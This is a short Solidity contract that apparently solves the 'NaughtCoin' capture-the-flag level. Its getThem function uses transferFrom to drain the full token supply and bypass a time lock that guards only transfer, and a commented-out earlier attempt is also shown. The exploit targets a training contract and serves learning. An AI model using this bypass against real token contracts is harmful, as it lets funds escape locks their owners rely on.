// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// import "https://github.com/OpenZeppelin/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

interface INaughtCoin {
    function timeLock() external view returns (uint);

    function INITIAL_SUPPLY() external view returns (uint256);

    function player() external view returns (address);

    function transfer(address _to, uint256 _value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);
}

contract TokenReceiver {
    // function getThem(address _adr) public {
    //   INaughtCoin(_adr).transfer(address(this),INaughtCoin(_adr).INITIAL_SUPPLY());
    // }

    function getThem(address _adr) public {
        INaughtCoin(_adr).transferFrom(
            msg.sender,
            address(this),
            INaughtCoin(_adr).INITIAL_SUPPLY()
        );
    }
    //1000000000000000000000000
}
